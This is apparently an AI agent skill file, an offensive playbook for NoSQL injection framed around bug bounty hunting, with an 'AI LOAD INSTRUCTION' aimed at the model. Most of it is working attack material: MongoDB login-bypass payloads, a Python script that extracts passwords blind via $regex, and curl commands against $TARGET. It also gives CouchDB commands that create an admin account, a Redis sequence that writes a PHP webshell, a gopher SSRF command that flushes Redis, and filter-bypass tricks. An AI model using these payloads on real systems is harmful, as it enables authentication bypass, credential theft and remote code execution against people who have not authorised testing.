---
name: vuln-nosql
description: NoSQL injection playbook — MongoDB operator injection ($ne/$gt/$regex/$where), login bypass, blind extraction, aggregation pipeline injection, CouchDB HTTP API, Redis injection, automation scripts. Use when MongoDB-style operators, JSON query objects, or flexible search filters are in scope.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction via $regex, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns. Base models often miss the bracket-notation PHP injection form and the blind $regex oracle technique.

## 0. RELATED ROUTING

- sqli-sql-injection — if the backend is relational
- http-parameter-pollution — HPP can deliver NoSQL operator injection via bracket notation

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
Same as PHP — use bracket notation to inject objects:
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution context |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use `$regex` to extract field values character by character:

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

**Automate** with NoSQLMap or custom script with binary search on character set.

### Automation Script (Python)

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

`$where` evaluates JavaScript in MongoDB context.
**Can only use current document's fields** — not OS access. But allows logic abuse:

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

**Note**: `$where` runs JavaScript on the MongoDB server. Besides logic abuse and timing oracles, older MongoDB builds without a tight V8 sandbox historically raised RCE concerns; treat any `$where` sink as high risk.

---

## 6. AGGREGATION PIPELINE INJECTION

When user-controlled data enters `$match` or `$group` stages:

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

Inject operators to bypass:
```json
// Input as object:
{"$ne": null}  → matches all categories
{"$regex": ".*"}  → matches all
```

Advanced: `$lookup` for cross-collection access, `$out` to write results to accessible collection:
```json
{ $lookup: {
    from: "admin_users",
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}
```

---

## 7. HTTP PARAMETER POLLUTION FOR NOSQL

Some frameworks (Express.js with `qs`, PHP) parse repeating parameters as arrays:
```
?filter=value1&filter=value2 → filter = ["value1", "value2"]
```

Use `qs` library parse behavior in Node.js:
```
?filter[$ne]=invalid
→ parsed as: filter = {$ne: "invalid"}
→ NoSQL operator injection
```

---

## 8. COUCHDB ATTACKS

### HTTP Admin API (if exposed)
```bash
# List databases:
curl http://target.com:5984/_all_dbs

# Read all documents in a DB:
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# Create admin account (if anonymous access allowed):
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. REDIS INJECTION

Redis exposed (port 6379) with no auth — command injection via input used in Redis queries:

```
# Via SSRF or direct injection:
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

**Auth bypass** (older Redis with `requirepass` using simple password):
```
AUTH password
AUTH 123456
AUTH redis
AUTH admin
```

---

## 10. DETECTION PAYLOADS

Send these to any input processed by NoSQL backend:

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', sleep(1000)
1' ; sleep(1000)
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
```

**JSON variant** test (change Content-Type to `application/json` if endpoint is form-based):
```json
{"username": "admin", "password": {"$ne": ""}}
```

---

## 11. NOSQL VS SQL — KEY DIFFERENCES

| Aspect | SQLi | NoSQLi |
|---|---|---|
| Language | SQL syntax | Query operator objects |
| Injection vector | String concatenation | Object/operator injection |
| Common signal | Quote breaks response | `{$ne:x}` changes response |
| Extraction method | UNION / error-based | `$regex` character oracle |
| Auth bypass | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS command | xp_cmdshell (MSSQL) | Rare (need `$where` + CVE) |
| Fingerprint | DB-specific error messages | "cannot use $" errors |

---

## 12. TESTING CHECKLIST

```
□ Test login fields with: {"$ne": "invalid"} JSON body
□ Test URL-encoded forms: password[$ne]=invalid
□ Test $regex for blind enumeration of field values
□ Try $where with sleep() for time-based blind
□ Check 5984 port for CouchDB (unauthenticated admin)
□ Check 6379 port for Redis (unauthenticated)
□ Try Content-Type: application/json on form endpoints
□ Monitor for operator-related error messages ("BSON" "operator" "$not allowed")
□ Test aggregation pipeline if search/filter functionality exists
□ Try duplicate key bypass: {"id": "10", "id": "100"}
```

---

## 13. DUPLICATE KEY BYPASS

```json
// When app checks one key but processes another:
{"id": "10", "id": "100"}
// JSON parsers typically use last occurrence
// WAF validates id=10, app processes id=100
```


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
```
fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
' || '1'=='1               # always-true (string-context breakout)
' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
```
(PortSwigger: Injecting syntax into NoSQL queries.)

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium


